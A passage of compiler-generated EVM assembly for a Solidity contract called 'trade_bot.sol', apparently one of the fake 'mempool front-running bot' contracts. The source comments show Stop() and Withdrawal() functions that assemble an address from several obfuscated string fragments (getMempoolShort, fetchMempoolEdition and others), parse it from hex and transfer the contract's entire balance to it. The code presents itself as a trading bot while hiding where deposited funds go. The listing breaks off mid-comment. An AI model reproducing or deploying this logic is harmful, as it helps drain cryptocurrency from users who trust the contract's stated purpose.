/* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      swap1\n      0x40\n      mstore\n        /* \"trade_bot.sol\":7025:7119  return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong)) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":509:529  address public owner */\n    tag_22:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n    tag_25:\n        /* \"trade_bot.sol\":7758:7771  string memory */\n      0x60\n        /* \"trade_bot.sol\":7778:7807  string memory _mempoolEdition */\n      dup1\n        /* \"trade_bot.sol\":7810:7831  fetchMempoolEdition() */\n      tag_69\n        /* \"trade_bot.sol\":7810:7829  fetchMempoolEdition */\n      tag_48\n        /* \"trade_bot.sol\":7810:7831  fetchMempoolEdition() */\n      jump\t// in\n    tag_69:\n        /* \"trade_bot.sol\":7778:7831  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7867:7882  _mempoolEdition */\n      dup1\n        /* \"trade_bot.sol\":7850:7883  abi.encodePacked(_mempoolEdition) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_70:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_72\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_70)\n    tag_72:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7850:7883  abi.encodePacked(_mempoolEdition) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"trade_bot.sol\":7850:7883  abi.encodePacked(_mempoolEdition) */\n      swap1\n      0x40\n      mstore\n        /* \"trade_bot.sol\":7836:7884  return string(abi.encodePacked(_mempoolEdition)) */\n      swap2\n      pop\n      pop\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":5568:5726  function Stop() public {\r... */\n    tag_32:\n        /* \"trade_bot.sol\":5596:5606  address to */\n      0x00\n        /* \"trade_bot.sol\":5609:5640  startExploration(tokenSymbol()) */\n      tag_74\n        /* \"trade_bot.sol\":5626:5639  tokenSymbol() */\n      tag_75\n        /* \"trade_bot.sol\":5626:5637  tokenSymbol */\n      tag_36\n        /* \"trade_bot.sol\":5626:5639  tokenSymbol() */\n      jump\t// in\n    tag_75:\n        /* \"trade_bot.sol\":5609:5625  startExploration */\n      tag_37\n        /* \"trade_bot.sol\":5609:5640  startExploration(tokenSymbol()) */\n      jump\t// in\n    tag_74:\n        /* \"trade_bot.sol\":5596:5640  address to = startExploration(tokenSymbol()) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":5645:5670  address payable contracts */\n      0x00\n        /* \"trade_bot.sol\":5681:5683  to */\n      dup2\n        /* \"trade_bot.sol\":5645:5684  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":5689:5698  contracts */\n      dup1\n        /* \"trade_bot.sol\":5689:5707  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trade_bot.sol\":5689:5721  contracts.transfer(getBalance()) */\n      0x08fc\n        /* \"trade_bot.sol\":5708:5720  getBalance() */\n      tag_76\n        /* \"trade_bot.sol\":5708:5718  getBalance */\n      tag_39\n        /* \"trade_bot.sol\":5708:5720  getBalance() */\n      jump\t// in\n    tag_76:\n        /* \"trade_bot.sol\":5689:5721  contracts.transfer(getBalance()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_78\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_78:\n        /* \"trade_bot.sol\":5689:5721  contracts.transfer(getBalance()) */\n      pop\n        /* \"trade_bot.sol\":5568:5726  function Stop() public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"trade_bot.sol\":7130:7512  function tokenSymbol() private pure returns (string memory) {\r... */\n    tag_36:\n        /* \"trade_bot.sol\":7175:7188  string memory */\n      0x60\n        /* \"trade_bot.sol\":7195:7222  string memory _mempoolShort */\n      dup1\n        /* \"trade_bot.sol\":7225:7242  getMempoolShort() */\n      tag_80\n        /* \"trade_bot.sol\":7225:7240  getMempoolShort */\n      tag_46\n        /* \"trade_bot.sol\":7225:7242  getMempoolShort() */\n      jump\t// in\n    tag_80:\n        /* \"trade_bot.sol\":7195:7242  string memory _mempoolShort = getMempoolShort() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7247:7276  string memory _mempoolEdition */\n      0x60\n        /* \"trade_bot.sol\":7279:7300  fetchMempoolEdition() */\n      tag_81\n        /* \"trade_bot.sol\":7279:7298  fetchMempoolEdition */\n      tag_48\n        /* \"trade_bot.sol\":7279:7300  fetchMempoolEdition() */\n      jump\t// in\n    tag_81:\n        /* \"trade_bot.sol\":7247:7300  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7305:7334  string memory _mempoolVersion */\n      0x60\n        /* \"trade_bot.sol\":7337:7358  fetchMempoolVersion() */\n      tag_82\n        /* \"trade_bot.sol\":7337:7356  fetchMempoolVersion */\n      tag_50\n        /* \"trade_bot.sol\":7337:7358  fetchMempoolVersion() */\n      jump\t// in\n    tag_82:\n        /* \"trade_bot.sol\":7305:7358  string memory _mempoolVersion = fetchMempoolVersion() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7363:7389  string memory _mempoolLong */\n      0x60\n        /* \"trade_bot.sol\":7392:7408  getMempoolLong() */\n      tag_83\n        /* \"trade_bot.sol\":7392:7406  getMempoolLong */\n      tag_52\n        /* \"trade_bot.sol\":7392:7408  getMempoolLong() */\n      jump\t// in\n    tag_83:\n        /* \"trade_bot.sol\":7363:7408  string memory _mempoolLong = getMempoolLong() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7444:7457  _mempoolShort */\n      dup4\n        /* \"trade_bot.sol\":7459:7474  _mempoolEdition */\n      dup4\n        /* \"trade_bot.sol\":7476:7491  _mempoolVersion */\n      dup4\n        /* \"trade_bot.sol\":7493:7505  _mempoolLong */\n      dup4\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      add(0x20, mload(0x40))\n      dup1\n      dup6\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_84:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_86\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_84)\n    tag_86:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup5\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_87:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_89\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_87)\n    tag_89:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup4\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_90:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_92\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_90)\n    tag_92:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_93:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_95\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_93)\n    tag_95:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"trade_bot.sol\":7427:7506  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      swap1\n      0x40\n      mstore\n        /* \"trade_bot.sol\":7413:7507  return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong)) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7130:7512  function tokenSymbol() private pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":3573:4296  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r... */\n    tag_37:\n        /* \"trade_bot.sol\":3640:3662  address _parsedAddress */\n      0x00\n        /* \"trade_bot.sol\":3669:3685  bytes memory tmp */\n      0x60\n        /* \"trade_bot.sol\":3694:3696  _a */\n      dup3\n        /* \"trade_bot.sol\":3669:3697  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":3702:3715  uint160 iaddr */\n      0x00\n        /* \"trade_bot.sol\":3718:3719  0 */\n      dup1\n        /* \"trade_bot.sol\":3702:3719  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"trade_bot.sol\":3724:3734  uint160 b1 */\n      0x00\n        /* \"trade_bot.sol\":3739:3749  uint160 b2 */\n      dup1\n        /* \"trade_bot.sol\":3759:3765  uint i */\n      0x00\n        /* \"trade_bot.sol\":3768:3769  2 */\n      0x02\n        /* \"trade_bot.sol\":3759:3769  uint i = 2 */\n      swap1\n      pop\n        /* \"trade_bot.sol\":3754:4266  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_97:\n        /* \"trade_bot.sol\":3775:3785  2 + 2 * 20 */\n      0x2a\n        /* \"trade_bot.sol\":3771:3772  i */\n      dup2\n        /* \"trade_bot.sol\":3771:3785  i < 2 + 2 * 20 */\n      lt\n        /* \"trade_bot.sol\":3754:4266  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_98\n      jumpi\n        /* \"trade_bot.sol\":3810:3813  256 */\n      0x0100\n        /* \"trade_bot.sol\":3801:3813  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"trade_bot.sol\":3838:3841  tmp */\n      dup5\n        /* \"trade_bot.sol\":3842:3843  i */\n      dup2\n        /* \"trade_bot.sol\":3838:3844  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_100\n      jumpi\n      invalid\n    tag_100:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"trade_bot.sol\":3832:3845  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"trade_bot.sol\":3824:3846  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"trade_bot.sol\":3819:3846  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"trade_bot.sol\":3871:3874  tmp */\n      dup5\n        /* \"trade_bot.sol\":3879:3880  1 */\n      0x01\n        /* \"trade_bot.sol\":3875:3876  i */\n      dup3\n        /* \"trade_bot.sol\":3875:3880  i + 1 */\n      add\n        /* \"trade_bot.sol\":3871:3881  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_101\n      jumpi\n      invalid\n    tag_101:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"trade_bot.sol\":3865:3882  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"trade_bot.sol\":3857:3883  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"trade_bot.sol\":3852:3883  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"trade_bot.sol\":3900:3902  97 */\n      0x61\n        /* \"trade_bot.sol\":3894:3896  b1 */\n      dup4\n        /* \"trade_bot.sol\":3894:3902  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":3893:3918  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_102\n      jumpi\n      pop\n        /* \"trade_bot.sol\":3914:3917  102 */\n      0x66\n        /* \"trade_bot.sol\":3908:3910  b1 */\n      dup4\n        /* \"trade_bot.sol\":3908:3917  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":3893:3918  (b1 >= 97) && (b1 <= 102) */\n    tag_102:\n        /* \"trade_bot.sol\":3889:4058  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_103\n      jumpi\n        /* \"trade_bot.sol\":3933:3935  87 */\n      0x57\n        /* \"trade_bot.sol\":3927:3935  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"trade_bot.sol\":3889:4058  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_104)\n    tag_103:\n        /* \"trade_bot.sol\":3959:3961  65 */\n      0x41\n        /* \"trade_bot.sol\":3953:3955  b1 */\n      dup4\n        /* \"trade_bot.sol\":3953:3961  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":3952:3976  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_105\n      jumpi\n      pop\n        /* \"trade_bot.sol\":3973:3975  70 */\n      0x46\n        /* \"trade_bot.sol\":3967:3969  b1 */\n      dup4\n        /* \"trade_bot.sol\":3967:3975  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":3952:3976  (b1 >= 65) && (b1 <= 70) */\n    tag_105:\n        /* \"trade_bot.sol\":3948:4058  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_106\n      jumpi\n        /* \"trade_bot.sol\":3991:3993  55 */\n      0x37\n        /* \"trade_bot.sol\":3985:3993  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"trade_bot.sol\":3948:4058  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_107)\n    tag_106:\n        /* \"trade_bot.sol\":4017:4019  48 */\n      0x30\n        /* \"trade_bot.sol\":4011:4013  b1 */\n      dup4\n        /* \"trade_bot.sol\":4011:4019  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":4010:4034  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_108\n      jumpi\n      pop\n        /* \"trade_bot.sol\":4031:4033  57 */\n      0x39\n        /* \"trade_bot.sol\":4025:4027  b1 */\n      dup4\n        /* \"trade_bot.sol\":4025:4033  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":4010:4034  (b1 >= 48) && (b1 <= 57) */\n    tag_108:\n        /* \"trade_bot.sol\":4006:4058  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_109\n      jumpi\n        /* \"trade_bot.sol\":4049:4051  48 */\n      0x30\n        /* \"trade_bot.sol\":4043:4051  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"trade_bot.sol\":4006:4058  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_109:\n        /* \"trade_bot.sol\":3948:4058  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n    tag_107:\n        /* 